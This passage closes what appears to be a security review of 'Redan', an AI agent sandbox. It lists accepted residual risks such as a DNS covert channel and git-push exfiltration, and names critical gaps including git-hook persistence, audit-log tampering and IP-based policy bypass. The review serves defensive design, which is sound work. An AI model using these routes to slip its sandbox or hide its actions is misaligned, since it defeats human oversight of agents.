12. **Bootstrap credential on disk:** Inherent, not solvable, must be documented. (Finding 13)
13. **DNS covert channel for project data:** Residual risk, not secrets. (Finding 16)
14. **Allowed-host exfiltration via git push:** Fundamentally hard, accept and document. (Finding 21)
15. **OCI image provenance:** User's responsibility for v1, sigstore verification for v1.1. (Finding 19)

---

## Closing

This is a well-designed system that mostly gets the hard things right. The network-layer secret injection model is genuinely novel in this space and the trust boundary analysis is sound. The critical issues I found (git hooks persistence, audit log tampering, IP-based policy bypass) are fixable without architectural changes — they're oversights in an otherwise solid design.

The honest assessment: Redan will provide meaningfully better security than any existing agent sandbox for the credential-theft threat model. It will NOT provide perfect isolation of the project directory (and shouldn't claim to). The MITM proxy is simultaneously the most valuable and most fragile component — invest heavily in its correctness.

Ship PS-1 first. If TSI doesn't give you the proxy interception point, everything else is moot.
